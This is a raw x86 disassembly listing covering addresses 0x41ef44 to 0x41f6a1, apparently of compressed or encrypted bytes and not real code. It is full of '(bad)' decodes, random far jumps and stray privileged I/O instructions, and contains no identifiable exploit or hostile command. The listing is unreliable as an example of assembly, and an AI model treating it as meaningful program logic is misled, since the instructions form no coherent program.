  41ef44:	inc    eax
  41ef45:	repz cdq 
  41ef47:	jno    0x41efb6
  41ef49:	iret   
  41ef4a:	pop    esp
  41ef4b:	sbb    edi,DWORD PTR ds:0x1d91d203
  41ef51:	mov    edx,esp
  41ef53:	xchg   ebp,eax
  41ef54:	and    al,0x6f
  41ef56:	lock mov dh,0xfd
  41ef59:	fsubr  QWORD PTR [ecx]
  41ef5b:	cmp    eax,ecx
  41ef5d:	sub    dh,BYTE PTR [edi-0x7317e36a]
  41ef63:	mov    ch,0xbb
  41ef65:	dec    esp
  41ef66:	inc    ebx
  41ef67:	imul   BYTE PTR [eax+0x44]
  41ef6a:	xor    dh,BYTE PTR [esi+eiz*4+0x70]
  41ef6e:	aam    0xda
  41ef70:	pop    ecx
  41ef71:	leave  
  41ef72:	inc    esi
  41ef73:	add    esp,edi
  41ef75:	cdq    
  41ef76:	call   FWORD PTR [ebx]
  41ef78:	int3   
  41ef79:	push   esp
  41ef7a:	adc    BYTE PTR [ecx+edx*2-0x2c],bl
  41ef7e:	jle    0x41ef8c
  41ef80:	arpl   WORD PTR [esi+eiz*4+0x1d],bx
  41ef84:	xlat   BYTE PTR ds:[ebx]
  41ef85:	or     DWORD PTR [edi+0x3e1377d6],eax
  41ef8b:	into   
  41ef8c:	mov    dh,0xda
  41ef8e:	mov    ebp,0x240fac0e
  41ef93:	shr    BYTE PTR [ecx],cl
  41ef95:	cli    
  41ef96:	push   es
  41ef97:	pop    ecx
  41ef98:	inc    ecx
  41ef99:	mov    ebp,0x771dbe15
  41ef9e:	mov    ecx,0x1588d13d
  41efa3:	jp     0x41eff0
  41efa5:	fdivr  DWORD PTR [edx-0x1569da99]
  41efab:	and    al,0xeb
  41efad:	sbb    BYTE PTR [ecx-0xb16cf7b],0xc8
  41efb4:	mov    ah,0x85
  41efb6:	sahf   
  41efb7:	gs mov eax,edi
  41efba:	sub    ah,BYTE PTR [esi-0x380ae887]
  41efc0:	repnz fldl2t 
  41efc3:	mov    bl,0xad
  41efc5:	jo     0x41efb0
  41efc7:	adc    al,0x2d
  41efc9:	cmp    cl,0xda
  41efcc:	pop    ebp
  41efcd:	fwait
  41efce:	jb     0x41efe6
  41efd0:	push   es
  41efd1:	cwde   
  41efd2:	arpl   dx,ax
  41efd4:	(bad)  
  41efd5:	(bad)
  41efda:	xor    ebx,ecx
  41efdc:	jmp    0x51ee:0xf1bd49c5
  41efe3:	pop    ebx
  41efe4:	mov    cl,0xb3
  41efe6:	les    eax,FWORD PTR [eax]
  41efe8:	(bad)  
  41efe9:	jns    0x41efbe
  41efeb:	mov    ebp,0x7f0e92c6
  41eff0:	addr16 mov dh,0xea
  41eff3:	test   al,0x34
  41eff5:	push   esi
  41eff6:	pop    gs
  41eff8:	imul   ecx,DWORD PTR [esi-0x18fd62d3],0xffffffc1
  41efff:	inc    edx
  41f000:	rcr    cl,cl
  41f002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f003:	rol    BYTE PTR [edx+0x1afda049],0xb9
  41f00a:	pop    ebx
  41f00b:	cs and al,0xde
  41f00e:	push   esp
  41f00f:	jmp    0x41eff8
  41f011:	mov    al,ds:0x18ceffad
  41f016:	in     al,0x7e
  41f018:	and    al,0x59
  41f01a:	push   ds
  41f01b:	loope  0x41efc9
  41f01d:	sub    dl,BYTE PTR [ecx-0x57]
  41f020:	sub    eax,0xa9d4a553
  41f025:	add    DWORD PTR [ebp+0x75e498f4],eax
  41f02b:	mov    esp,0x8d6bbf0c
  41f030:	stos   BYTE PTR es:[edi],al
  41f031:	or     al,dl
  41f033:	sub    DWORD PTR [ebp+0x59bea43c],edx
  41f039:	ror    BYTE PTR [edx],0x11
  41f03c:	xor    BYTE PTR [ebx-0x71],cl
  41f03f:	cmc    
  41f040:	or     edx,ecx
  41f042:	mov    eax,ds
  41f044:	sub    al,0x59
  41f046:	leave  
  41f047:	data16 fadd DWORD PTR [edi+0x5d507ab]
  41f04e:	adc    eax,0x252a8e52
  41f053:	xchg   DWORD PTR [edx],ebx
  41f055:	mov    al,0x43
  41f057:	arpl   WORD PTR ds:0x5d3cb743,ax
  41f05d:	pop    esp
  41f05e:	inc    edx
  41f05f:	mov    eax,gs:0x46c227ca
  41f065:	mov    DWORD PTR [edi],ebx
  41f067:	fs xchg DWORD PTR ss:[ebx+0xe],ebp
  41f06c:	scas   al,BYTE PTR es:[edi]
  41f06d:	push   ds
  41f06e:	retf   0x52ed
  41f071:	scas   al,BYTE PTR es:[edi]
  41f072:	jmp    0x974c:0x62a71eed
  41f079:	xor    bh,BYTE PTR [eax+0x6e]
  41f07c:	xchg   edi,eax
  41f07d:	inc    edi
  41f07e:	shr    cl,0x24
  41f081:	shl    DWORD PTR [ecx+0x5d973d1],1
  41f087:	loope  0x41f03d
  41f089:	xchg   DWORD PTR [ebx],ebp
  41f08b:	(bad)  
  41f08c:	repnz mov esi,0xa598f160
  41f092:	jae    0x41f091
  41f094:	mov    BYTE PTR ds:0x55b54c73,ch
  41f09a:	add    esp,DWORD PTR [esi+0x7c]
  41f09d:	mov    esp,0x84ea74b2
  41f0a2:	in     eax,0xee
  41f0a4:	sahf   
  41f0a5:	aas    
  41f0a6:	cmp    dl,BYTE PTR [ecx+0x66599bf1]
  41f0ac:	dec    edi
  41f0ad:	jbe    0x41f0d8
  41f0af:	mov    ebp,0x9eb6ed11
  41f0b4:	cmp    BYTE PTR ds:0xcf82413e,al
  41f0ba:	push   ss
  41f0bb:	int3   
  41f0bc:	repz add bh,BYTE PTR [edi-0x7317b503]
  41f0c3:	in     eax,dx
  41f0c4:	sub    ebx,edi
  41f0c6:	mov    ecx,0x41a4cacf
  41f0cb:	into   
  41f0cc:	scas   al,BYTE PTR es:[edi]
  41f0cd:	pop    edx
  41f0ce:	mov    ch,0x9e
  41f0d0:	dec    edi
  41f0d1:	sahf   
  41f0d2:	push   es
  41f0d3:	gs aas 
  41f0d5:	jae    0x41f14b
  41f0d7:	xchg   BYTE PTR [esi-0x3652da34],ah
  41f0dd:	dec    ebx
  41f0de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0df:	adc    BYTE PTR [edi+ebp*4-0x67],0xfc
  41f0e4:	pop    esp
  41f0e5:	mov    ebp,ebp
  41f0e7:	sbb    DWORD PTR [esp+ebx*1+0x28efd6bf],edx
  41f0ee:	dec    ebp
  41f0ef:	mov    eax,ds:0xf93530ce
  41f0f4:	(bad)  
  41f0f5:	cmp    esi,DWORD PTR [edx+0x1]
  41f0f8:	push   ecx
  41f0f9:	mov    esi,0xc7b07b53
  41f0fe:	clc    
  41f0ff:	sub    al,0x9a
  41f101:	and    ebx,edi
  41f103:	test   BYTE PTR [edx-0x1e65fc73],al
  41f109:	jle    0x41f16b
  41f10b:	out    dx,eax
  41f10c:	mov    eax,ds:0x93ea0db1
  41f111:	in     al,0x27
  41f113:	dec    esp
  41f114:	or     al,0xf0
  41f116:	jne    0x41f115
  41f118:	mov    al,0x5a
  41f11a:	or     ebp,0xd6658ccb
  41f120:	push   ds
  41f121:	jl     0x41f122
  41f123:	xor    BYTE PTR [ebx+0x3e],bl
  41f126:	retf   
  41f127:	retf   0xe0b9
  41f12a:	ret    0x346
  41f12d:	adc    al,0x15
  41f12f:	lahf   
  41f130:	inc    ebp
  41f131:	add    eax,0x767e6999
  41f136:	je     0x41f1a1
  41f138:	xchg   esp,eax
  41f139:	mov    cl,0xec
  41f13b:	dec    ecx
  41f13c:	jbe    0x41f1b8
  41f13e:	mov    ebx,0x453b8861
  41f143:	lods   eax,DWORD PTR ds:[esi]
  41f144:	jnp    0x41f175
  41f146:	fist   WORD PTR ds:0xd40eca82
  41f14c:	and    al,0xd3
  41f14e:	xor    dl,dl
  41f150:	lds    edx,FWORD PTR [ebp+0x71]
  41f153:	lahf   
  41f154:	cmp    cl,al
  41f156:	cmc    
  41f157:	dec    esi
  41f158:	sbb    bl,BYTE PTR [edi]
  41f15a:	loopne 0x41f163
  41f15c:	sub    esp,ecx
  41f15e:	retf   
  41f15f:	push   ss
  41f160:	mov    dh,0x55
  41f162:	leave  
  41f163:	hlt    
  41f164:	mov    WORD PTR [esi-0x7c],fs
  41f167:	(bad)  
  41f168:	enter  0x26d9,0xf4
  41f16c:	mov    DWORD PTR [ebx],ebx
  41f16e:	sbb    al,0x9f
  41f170:	aaa    
  41f171:	mov    bh,bh
  41f173:	iret   
  41f174:	sub    BYTE PTR [eax+0x7c],0x4c
  41f178:	push   ebx
  41f179:	push   ss
  41f17a:	shl    DWORD PTR [eax+ebx*8-0x75],cl
  41f17e:	mov    edi,0x33d71ac5
  41f183:	mov    dh,BYTE PTR [eax-0x66c7d55f]
  41f189:	test   DWORD PTR [edx],0xa74244c
  41f18f:	sub    ebp,DWORD PTR [esi]
  41f191:	mov    al,0x1b
  41f193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f194:	adc    ebx,DWORD PTR [ebp+0x2f]
  41f197:	jne    0x41f1ff
  41f199:	pushf  
  41f19a:	sar    DWORD PTR [eax+ecx*4-0x3916e100],1
  41f1a1:	cmp    eax,0x6540cbef
  41f1a6:	mov    ah,0xa9
  41f1a8:	mov    ch,0x7a
  41f1aa:	pop    ss
  41f1ab:	inc    ecx
  41f1ac:	xchg   edi,eax
  41f1ad:	aaa    
  41f1ae:	dec    ebp
  41f1af:	mov    cl,0xf9
  41f1b1:	dec    ecx
  41f1b2:	push   0x17f87c4c
  41f1b7:	das    
  41f1b8:	inc    esi
  41f1b9:	or     BYTE PTR [ecx-0x10bd042a],ah
  41f1bf:	pop    es
  41f1c0:	pusha  
  41f1c1:	inc    ecx
  41f1c2:	mov    dh,0x84
  41f1c4:	jge    0x41f15a
  41f1c6:	pop    sp
  41f1c8:	pop    ebp
  41f1c9:	fcmove st,st(6)
  41f1cb:	xchg   DWORD PTR [eax],ebp
  41f1cd:	mov    ds:0x9d237fda,eax
  41f1d2:	(bad)  [ebx]
  41f1d4:	fidivr WORD PTR [ecx+ecx*4+0x65f9af1d]
  41f1db:	ins    DWORD PTR es:[edi],dx
  41f1dc:	stos   DWORD PTR es:[edi],eax
  41f1dd:	mov    ebx,0xb241043a
  41f1e2:	cld    
  41f1e3:	jge    0x41f205
  41f1e5:	inc    esi
  41f1e6:	ret    0xff94
  41f1e9:	(bad)  
  41f1ea:	adc    al,0x3c
  41f1ec:	jmp    0x41f1f5
  41f1ee:	call   FWORD PTR [edx-0x4a]
  41f1f1:	and    BYTE PTR [edx],dl
  41f1f3:	cmp    edx,ebx
  41f1f5:	cs aaa 
  41f1f7:	out    dx,al
  41f1f8:	fcom   QWORD PTR [ebx]
  41f1fa:	sub    al,0xd0
  41f1fc:	inc    BYTE PTR [ebx-0x46449fd1]
  41f202:	adc    dh,cl
  41f204:	mov    ch,0x19
  41f206:	(bad)  
  41f207:	cmp    BYTE PTR [eax-0x6d],bh
  41f20a:	dec    esi
  41f20b:	iret   
  41f20c:	(bad)  [eax-0x5e]
  41f20f:	dec    edi
  41f210:	fxch   st(0)
  41f212:	sbb    eax,0xb4ff94c6
  41f217:	mov    ebx,0x2cb59cbf
  41f21c:	aaa    
  41f21d:	ins    BYTE PTR es:[edi],dx
  41f21e:	loope  0x41f1b2
  41f220:	loope  0x41f263
  41f222:	aas    
  41f223:	push   ebx
  41f224:	push   esp
  41f225:	in     al,0x53
  41f227:	and    al,0xd1
  41f229:	lea    ebx,[ecx-0x4a6ae0f4]
  41f22f:	pop    ebp
  41f230:	sbb    edi,eax
  41f232:	sar    DWORD PTR [ebx-0x20],0xff
  41f236:	sbb    ebx,DWORD PTR [ebx-0x7b61f3e0]
  41f23c:	push   cs
  41f23d:	dec    esp
  41f23e:	dec    ebx
  41f23f:	stos   BYTE PTR es:[edi],al
  41f240:	mov    ?,ebp
  41f242:	pushf  
  41f243:	cs pop edi
  41f245:	mov    eax,0xc62afd97
  41f24a:	sbb    al,BYTE PTR [ecx+0x58]
  41f24d:	adc    edx,0x5b393131
  41f253:	cmp    eax,0x83e690b
  41f258:	clc    
  41f259:	pop    esi
  41f25a:	cmp    eax,0xd0a622ec
  41f25f:	cwde   
  41f260:	ret    0x7cf8
  41f263:	pop    esp
  41f264:	mov    edx,0x58e17f9b
  41f269:	lock sub eax,0x2e6fe49
  41f26f:	arpl   sp,ax
  41f271:	push   esi
  41f272:	popa   
  41f273:	test   DWORD PTR [ebx],ebp
  41f275:	xchg   DWORD PTR [eax+eiz*2+0x7728424d],edi
  41f27c:	icebp  
  41f27d:	call   0x2971:0xdb54f468
  41f284:	mov    ecx,DWORD PTR [esi+0x61]
  41f287:	fsubr  st(6),st
  41f289:	(bad)  
  41f28a:	(bad)  
  41f28b:	mov    eax,0xe8948d28
  41f290:	outs   dx,BYTE PTR ds:[esi]
  41f291:	dec    edx
  41f292:	inc    esp
  41f293:	push   ss
  41f294:	inc    eax
  41f295:	arpl   cx,si
  41f297:	inc    esp
  41f298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f299:	in     eax,0xd1
  41f29b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f29c:	int    0x39
  41f29e:	repnz xchg ebx,eax
  41f2a0:	jmp    0x41f2e2
  41f2a2:	enter  0x7e94,0xb6
  41f2a6:	retf   0x27
  41f2a9:	das    
  41f2aa:	add    eax,DWORD PTR [ecx+0x9]
  41f2ad:	xchg   esp,eax
  41f2ae:	cwde   
  41f2af:	or     bl,bh
  41f2b1:	(bad)  
  41f2b2:	je     0x41f2cc
  41f2b4:	dec    edi
  41f2b5:	cs jg  0x41f2d6
  41f2b8:	xor    al,0xd1
  41f2ba:	xchg   ebx,eax
  41f2bb:	cli    
  41f2bc:	mov    edx,0xe6d4684b
  41f2c1:	scas   eax,DWORD PTR es:[edi]
  41f2c2:	nop
  41f2c3:	push   ebp
  41f2c4:	in     eax,0x51
  41f2c6:	mov    bl,0x7f
  41f2c8:	gs pop esp
  41f2ca:	pop    ds
  41f2cb:	(bad)  
  41f2cc:	in     al,0xbd
  41f2ce:	sub    ebp,DWORD PTR [ecx]
  41f2d0:	inc    ebp
  41f2d1:	aas    
  41f2d2:	or     ebx,DWORD PTR [edi+0x11fa8f82]
  41f2d8:	rcr    DWORD PTR [ebx+0x6a68f528],1
  41f2de:	outs   dx,DWORD PTR ds:[esi]
  41f2df:	push   ebp
  41f2e0:	ja     0x41f2cb
  41f2e2:	mov    DWORD PTR [edx-0xa],edx
  41f2e5:	add    DWORD PTR [ebp*2-0x173a3133],0xe3834897
  41f2f0:	add    al,0xa4
  41f2f2:	jecxz  0x41f2c3
  41f2f4:	cmp    bh,BYTE PTR [ecx+ebp*8]
  41f2f7:	push   eax
  41f2f8:	clc    
  41f2f9:	jp     0x41f2d0
  41f2fb:	push   0x2d
  41f2fd:	out    0xf9,al
  41f2ff:	jae    0x41f2b0
  41f301:	jmp    0x143e:0xe49f43f7
  41f308:	and    ch,al
  41f30a:	scas   al,BYTE PTR es:[edi]
  41f30b:	scas   al,BYTE PTR es:[edi]
  41f30c:	jb     0x41f36a
  41f30e:	fst    DWORD PTR [ebx-0x6c]
  41f311:	sbb    al,0x2e
  41f313:	adc    ebp,ebp
  41f315:	sbb    DWORD PTR [edx],0xffffffd8
  41f318:	out    0x4d,eax
  41f31a:	cmc    
  41f31b:	sub    ebp,DWORD PTR [esp+ebx*8+0x0]
  41f31f:	pop    esp
  41f320:	into   
  41f321:	inc    eax
  41f322:	sbb    eax,0xc076b269
  41f327:	cdq    
  41f328:	push   cs
  41f329:	scas   al,BYTE PTR es:[edi]
  41f32a:	jg     0x41f3a3
  41f32c:	jns    0x41f34f
  41f32e:	ins    DWORD PTR es:[edi],dx
  41f32f:	sbb    esp,DWORD PTR [eax-0x16]
  41f332:	jecxz  0x41f324
  41f334:	xchg   dl,cl
  41f336:	and    BYTE PTR [edi-0x65c28d97],cl
  41f33c:	inc    esi
  41f33d:	mov    ?,WORD PTR [ebp+0x1b]
  41f340:	pushf  
  41f341:	inc    ecx
  41f342:	dec    ebx
  41f343:	jbe    0x41f35e
  41f345:	loop   0x41f35c
  41f347:	cmp    BYTE PTR [ebx+0x6],bh
  41f34a:	mov    ds:0x644db955,eax
  41f34f:	in     eax,dx
  41f350:	add    bh,BYTE PTR [ebx]
  41f352:	pop    ds
  41f353:	sub    ah,BYTE PTR [eax-0xc4e84d0]
  41f359:	out    0x54,al
  41f35b:	mov    ch,0xa5
  41f35d:	mov    gs,WORD PTR [ebx-0x15c8256b]
  41f363:	hlt    
  41f364:	jp     0x41f2e9
  41f366:	push   esi
  41f367:	mov    bl,0xc5
  41f369:	jne    0x41f2ed
  41f36b:	aaa    
  41f36c:	je     0x41f3d6
  41f36e:	sar    BYTE PTR [eax],cl
  41f370:	pop    ebx
  41f371:	ins    BYTE PTR es:[edi],dx
  41f372:	popf   
  41f373:	fistp  QWORD PTR [ebp+0x2e5890f3]
  41f379:	push   esp
  41f37a:	arpl   WORD PTR [eax],ax
  41f37c:	aam    0xde
  41f37e:	push   ebp
  41f37f:	pusha  
  41f380:	sub    DWORD PTR [edx+0x5e],0x452ab896
  41f387:	sub    DWORD PTR [edx-0x5d],0x53
  41f38b:	fidiv  WORD PTR [ebp+0x17]
  41f38e:	scas   eax,DWORD PTR es:[edi]
  41f38f:	and    eax,0xed56aa4
  41f394:	test   ch,bh
  41f396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f397:	adc    al,0xae
  41f399:	ja     0x41f347
  41f39b:	sti    
  41f39c:	imul   eax,DWORD PTR [esi],0x4136bfa
  41f3a2:	or     al,0xcc
  41f3a4:	imul   ebp,DWORD PTR [esi-0x1028e7ec],0x17
  41f3ab:	out    0x25,eax
  41f3ad:	pop    ss
  41f3ae:	aaa    
  41f3af:	push   esp
  41f3b0:	loopne 0x41f363
  41f3b2:	fcom   DWORD PTR [eax]
  41f3b4:	repnz pop edi
  41f3b6:	(bad)  
  41f3b7:	out    dx,al
  41f3b8:	cmp    ebp,DWORD PTR [edx-0x5b439dd7]
  41f3be:	adc    ah,bl
  41f3c0:	inc    esi
  41f3c1:	mov    ebp,0xd5057e1d
  41f3c6:	or     dl,cl
  41f3c8:	pop    edi
  41f3c9:	cmc    
  41f3ca:	cwde   
  41f3cb:	pop    ds
  41f3cc:	pop    ds
  41f3cd:	iret   
  41f3ce:	popa   
  41f3cf:	out    dx,eax
  41f3d0:	jle    0x41f38a
  41f3d2:	fsub   st,st(7)
  41f3d4:	push   0x26
  41f3d6:	add    BYTE PTR gs:[esi+0x76],0xa1
  41f3db:	aam    0xc8
  41f3dd:	mov    WORD PTR [esi],ss
  41f3df:	cmp    ah,0x97
  41f3e2:	imul   esp,esi,0x57
  41f3e5:	cmp    ebp,0xa
  41f3e8:	xor    esi,ecx
  41f3ea:	mov    ah,0x55
  41f3ec:	cmp    eax,0x203800c
  41f3f1:	or     DWORD PTR [ebp+0x2d],ecx
  41f3f4:	cs adc esi,esi
  41f3f7:	ins    DWORD PTR es:[edi],dx
  41f3f8:	popf   
  41f3f9:	aam    0x36
  41f3fb:	sub    eax,0x4f74995f
  41f400:	cmc    
  41f401:	adc    eax,0xc0df7f69
  41f406:	loope  0x41f434
  41f408:	sbb    al,0xf2
  41f40a:	(bad)  
  41f40b:	ror    DWORD PTR [eax-0x258e90b],1
  41f411:	int    0x70
  41f413:	xor    DWORD PTR [ebx-0x40883ffc],0x624cd697
  41f41d:	sar    DWORD PTR [ecx],0xb2
  41f420:	cmp    al,BYTE PTR [esi-0xe]
  41f423:	sbb    BYTE PTR ds:0x2ccdf339,0x16
  41f42a:	mov    ebp,0x7adbc1ee
  41f42f:	sbb    DWORD PTR [ebp-0x3029030c],esp
  41f435:	jmp    0xbf2c:0x9c074e57
  41f43c:	arpl   WORD PTR [ebx-0x7e3f94f0],cx
  41f442:	fsubr  DWORD PTR [eax-0x684cec2c]
  41f448:	jne    0x41f3ed
  41f44a:	mov    al,ds:0x2a738c0b
  41f44f:	pushf  
  41f450:	xor    edx,DWORD PTR [edi-0x8]
  41f453:	out    dx,al
  41f454:	rcr    ecx,cl
  41f456:	jg     0x41f4c3
  41f458:	aam    0xc6
  41f45a:	jae    0x41f431
  41f45c:	sahf   
  41f45d:	in     eax,dx
  41f45e:	test   eax,0xb56fe69b
  41f463:	ja     0x41f474
  41f465:	retf   0xba66
  41f468:	nop
  41f469:	lahf   
  41f46a:	adc    BYTE PTR [esi-0x1],ch
  41f46d:	jle    0x41f447
  41f46f:	or     esi,ebx
  41f471:	sbb    edx,ebx
  41f473:	and    dl,BYTE PTR [edi+0x62]
  41f476:	not    DWORD PTR [eax-0x3c77041f]
  41f47c:	in     eax,dx
  41f47d:	and    DWORD PTR [eax*4-0x32a25fb1],esp
  41f484:	addr16 inc ebp
  41f486:	add    eax,0x7f8bdf3a
  41f48b:	bound  esp,QWORD PTR [edi]
  41f48d:	push   ebp
  41f48e:	js     0x41f479
  41f490:	sbb    BYTE PTR [edx+0x2c3bf3bc],ch
  41f496:	lds    esp,FWORD PTR [ebp+0x61]
  41f499:	add    edi,DWORD PTR [ebx-0x18]
  41f49c:	jae    0x41f512
  41f49e:	jbe    0x41f4f3
  41f4a0:	pop    esp
  41f4a1:	push   esi
  41f4a2:	xchg   ebx,eax
  41f4a3:	mov    ah,0xf4
  41f4a5:	xchg   esp,eax
  41f4a6:	aam    0xa7
  41f4a8:	rcl    DWORD PTR [edi],1
  41f4aa:	jl     0x41f435
  41f4ac:	out    0x91,al
  41f4ae:	sbb    ebp,esi
  41f4b0:	sbb    DWORD PTR [eax+0x644ffe42],edi
  41f4b6:	lods   al,BYTE PTR ds:[esi]
  41f4b7:	rcr    DWORD PTR [esi+0x2f],cl
  41f4ba:	or     BYTE PTR [ecx+0x44],dh
  41f4bd:	cld    
  41f4be:	fcomp  QWORD PTR [edx-0x3de93f60]
  41f4c4:	mov    bl,0x43
  41f4c6:	mov    ecx,0x9c173394
  41f4cb:	pop    ds
  41f4cc:	xchg   esp,eax
  41f4cd:	lods   eax,DWORD PTR ds:[esi]
  41f4ce:	lea    esi,[ecx]
  41f4d0:	sbb    eax,0xa849c276
  41f4d5:	sbb    ecx,edx
  41f4d7:	add    edx,DWORD PTR [ebp+0x1c656c42]
  41f4dd:	cmp    bl,BYTE PTR [edi]
  41f4df:	push   ds
  41f4e0:	scas   eax,DWORD PTR es:[edi]
  41f4e1:	jge    0x41f471
  41f4e3:	sbb    bh,BYTE PTR [edx-0x531db882]
  41f4e9:	xchg   BYTE PTR cs:[edx-0x41],cl
  41f4ed:	addr16 inc esi
  41f4ef:	(bad)  
  41f4f0:	arpl   WORD PTR [ecx-0x28],bp
  41f4f3:	push   eax
  41f4f4:	inc    edi
  41f4f5:	add    dl,BYTE PTR [edx-0x5ae0168c]
  41f4fb:	aaa    
  41f4fc:	inc    esp
  41f4fd:	jl     0x41f52f
  41f4ff:	mov    esi,DWORD PTR [ecx-0x62870347]
  41f505:	loope  0x41f582
  41f507:	int    0x2d
  41f509:	inc    esi
  41f50a:	adc    DWORD PTR [ebx+0x4a],esp
  41f50d:	pop    ds
  41f50e:	or     eax,0x5e82d7a2
  41f513:	lds    ecx,FWORD PTR [eax]
  41f515:	mov    bl,0xa5
  41f517:	cmp    al,0xd
  41f519:	inc    edi
  41f51a:	xor    al,0xc
  41f51d:	stos   BYTE PTR es:[edi],al
  41f51e:	inc    edi
  41f51f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f520:	ror    DWORD PTR [edi+0x34d8571e],1
  41f526:	push   cs
  41f527:	mov    eax,0x98161452
  41f52c:	pop    ecx
  41f52d:	cli    
  41f52e:	mov    bh,0x1
  41f530:	repnz fidivr DWORD PTR ds:0xda67e9dc
  41f537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f538:	not    cl
  41f53a:	ret    
  41f53b:	ins    BYTE PTR es:[edi],dx
  41f53c:	ins    BYTE PTR es:[edi],dx
  41f53d:	adc    dh,BYTE PTR [edx]
  41f53f:	mov    eax,DWORD PTR [ebp-0x1a]
  41f542:	dec    ebx
  41f543:	xchg   ecx,eax
  41f544:	jb     0x41f567
  41f546:	mov    ah,0xa7
  41f548:	outs   dx,DWORD PTR ds:[esi]
  41f549:	outs   dx,DWORD PTR ds:[esi]
  41f54a:	enter  0x3dd6,0x5f
  41f54e:	xor    DWORD PTR [edx+0x3c],eax
  41f551:	add    ecx,DWORD PTR [esi]
  41f553:	mov    ebx,0x4bf1c58a
  41f558:	leave  
  41f559:	mov    dh,0xfd
  41f55b:	cmc    
  41f55c:	loopne 0x41f571
  41f55e:	inc    edi
  41f55f:	push   ebx
  41f560:	sbb    al,0x53
  41f562:	pop    ebp
  41f563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f564:	sub    DWORD PTR [edi-0x15],edx
  41f567:	push   es
  41f568:	push   ds
  41f569:	jl     0x41f541
  41f56b:	jnp    0x41f5bc
  41f56d:	pop    eax
  41f56e:	pop    ss
  41f56f:	(bad)  
  41f570:	mov    esi,0x70e10b7b
  41f575:	push   esp
  41f576:	mov    ?,WORD PTR [esi-0x62624015]
  41f57c:	inc    DWORD PTR [edx]
  41f57e:	jecxz  0x41f595
  41f580:	ja     0x41f554
  41f582:	cmp    bl,dh
  41f584:	les    edx,FWORD PTR [ecx+0x379fc45d]
  41f58a:	pop    eax
  41f58b:	xor    edx,ecx
  41f58d:	xchg   ebp,eax
  41f58e:	add    DWORD PTR [edx-0xe],eax
  41f591:	mov    ebp,0x486b7f6a
  41f596:	mul    ch
  41f598:	push   edx
  41f599:	xor    BYTE PTR [ebx+0xf],ah
  41f59c:	cmp    dh,bl
  41f59e:	pop    edi
  41f59f:	jg     0x41f583
  41f5a1:	push   ebx
  41f5a2:	ret    0x523a
  41f5a5:	sub    eax,0x78e41254
  41f5aa:	cmp    dh,0x8d
  41f5ad:	aaa    
  41f5ae:	push   esp
  41f5af:	cmp    esi,ecx
  41f5b1:	pop    edx
  41f5b2:	pop    edi
  41f5b3:	fsubr  DWORD PTR [eax+0x1d364b1d]
  41f5b9:	sbb    BYTE PTR [edx-0xf43b381],bl
  41f5bf:	mov    BYTE PTR [eax+ecx*8+0x7a],dh
  41f5c3:	push   edi
  41f5c4:	and    DWORD PTR [esi+0x24a9cf84],esp
  41f5ca:	in     eax,0x24
  41f5cc:	jmp    0x20629094
  41f5d1:	mov    ebp,0x6d0faa9d
  41f5d6:	(bad)  
  41f5d7:	xchg   edx,eax
  41f5d8:	cmp    eax,0x5b9e3daf
  41f5dd:	fist   DWORD PTR [ebp+0x36e912ed]
  41f5e3:	jmp    0x993d:0x59c84dfe
  41f5ea:	shl    DWORD PTR [ebx],0x2e
  41f5ed:	adc    al,0xb8
  41f5ef:	adc    DWORD PTR [edx-0x57],ecx
  41f5f2:	push   esp
  41f5f3:	jl     0x41f632
  41f5f5:	or     al,BYTE PTR [ebp+ecx*8-0x5d13c428]
  41f5fc:	fwait
  41f5fd:	daa    
  41f5fe:	jge    0x41f5c9
  41f600:	push   0x79
  41f602:	outs   dx,DWORD PTR ds:[esi]
  41f603:	dec    eax
  41f604:	sbb    al,0x8c
  41f606:	ficomp DWORD PTR [ecx+0x701c937c]
  41f60c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f60d:	in     al,dx
  41f60e:	inc    ebx
  41f60f:	mov    ebx,0x7fbf531c
  41f614:	or     BYTE PTR [edi+edx*4],dl
  41f617:	mov    ds:0xd9554f93,al
  41f61c:	retf   
  41f61d:	jg     0x41f65c
  41f61f:	pop    ebp
  41f620:	push   eax
  41f621:	jmp    0x67235f7
  41f626:	jmp    0x6e993d26
  41f62b:	sub    DWORD PTR fs:[esi-0x55abf676],ebx
  41f632:	std    
  41f633:	sub    al,0xbb
  41f635:	push   ebp
  41f636:	lea    eax,[ebp-0x6d18f3dc]
  41f63c:	loope  0x41f6b6
  41f63e:	push   ds
  41f63f:	pop    ss
  41f640:	push   ebp
  41f641:	pop    edx
  41f642:	daa    
  41f643:	ins    BYTE PTR es:[edi],dx
  41f644:	das    
  41f645:	mov    bl,0xab
  41f647:	adc    BYTE PTR [eax-0x78],0x80
  41f64b:	push   es
  41f64c:	adc    DWORD PTR [edx],0xffffffb0
  41f64f:	(bad)  
  41f650:	ds das 
  41f652:	cli    
  41f653:	mov    dh,0x7e
  41f655:	fidivr DWORD PTR [esi+0x4b]
  41f658:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f65a:	arpl   WORD PTR [ecx+ebx*8+0x5f],dx
  41f65e:	dec    eax
  41f65f:	retf   0x26a3
  41f662:	ret    0xa39b
  41f665:	and    eax,0xafd26892
  41f66a:	mov    al,0x36
  41f66c:	xchg   BYTE PTR [ebx-0x576b318d],dl
  41f672:	sub    al,0x7a
  41f674:	cmp    BYTE PTR [eax+0x25],cl
  41f677:	mov    esp,0x674e2c7c
  41f67c:	je     0x41f6bd
  41f67e:	dec    edx
  41f67f:	sar    BYTE PTR [eax],0xaf
  41f682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f683:	mov    esi,gs
  41f685:	int3   
  41f686:	dec    ebp
  41f687:	dec    esi
  41f688:	fadd   QWORD PTR [edx-0x59143751]
  41f68e:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41f690:	test   eax,0xcadc0cc8
  41f695:	xchg   ebx,eax
  41f696:	mov    ah,0xcf
  41f698:	push   es
  41f699:	cli    
  41f69a:	push   ecx
  41f69b:	mov    bh,0x55
  41f69d:	xchg   ebx,eax
  41f69e:	ins    BYTE PTR es:[edi],dx
  41f69f:	dec    eax
  41f6a0:	std    
  41f6a1:	xchg   DWORD PTR [esi-0x18],eax
